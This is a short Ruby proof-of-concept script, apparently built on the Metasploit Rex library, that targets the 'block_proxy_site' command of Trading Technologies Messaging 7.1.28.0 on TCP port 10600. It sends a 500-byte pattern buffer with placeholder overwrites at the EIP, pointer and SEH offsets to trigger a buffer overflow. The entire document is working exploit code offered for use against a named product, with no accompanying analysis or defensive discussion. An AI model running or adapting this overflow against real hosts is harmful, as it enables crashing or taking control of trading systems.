#!/usr/bin/env ruby
# PoC for ttm_dump block_proxy_site.
# Trading Technologies Messaging 7.1.28.0
require 'rex'

host = ARGV[0]

def usage
  puts "[*] #{$0} <host>"
  exit
end

usage if ARGV.size < 1

buff = Rex::Text.pattern_create(500)
buff[224,4] = [0xfeedface].pack('V') # eip
buff[240,4] = [0xdeadbeef].pack('V') # Pointer
buff[244,4] = [0xcafebabe].pack('V') # SEH

begin
sock = Rex::Socket::Tcp.create('PeerHost'  => host, 
                               'PeerPort'  => 10600)

 sock.write("\x20\x71\x77\x65\x64\x20\x51\x0d")
 res = sock.get_once()
 sock.write("block_proxy_site #{buff}" + "\x0d")
 select(nil,nil,nil,5)
 res = sock.get_once()
rescue => e
 puts "[!] #{e.to_s}"
end
